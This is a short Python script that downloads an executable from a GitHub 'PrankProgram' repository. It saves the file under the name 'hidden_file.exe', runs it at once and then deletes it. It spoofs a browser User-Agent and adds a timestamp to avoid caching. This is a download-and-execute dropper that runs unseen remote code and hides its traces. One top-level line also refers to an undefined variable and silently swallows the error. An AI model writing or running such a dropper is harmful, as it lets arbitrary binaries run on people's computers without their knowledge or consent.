import requests,subprocess, os, time


try:
    os.remove(filename)
except:
    pass




def start():

    hidden_name = "hidden_file"
    filename = hidden_name+".exe"

    headers = {
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "User-Agent": "Mozilla/5.0"  # Helps avoid being blocked
    }

    url_content = requests.get(
        f"https://github.com/GummyC/PrankProgram/raw/refs/heads/main/Scripts/main_script.exe?ts={int(time.time())}",
        headers=headers,
        )



    with open(filename, "wb") as file_write:
        file_write.write(url_content.content)

    directory = os.path.abspath(filename)
    print(f"----> {directory}")
    print(time.time())
    subprocess.run([directory])
    os.remove(filename)

if __name__ == "__main__":
    start()
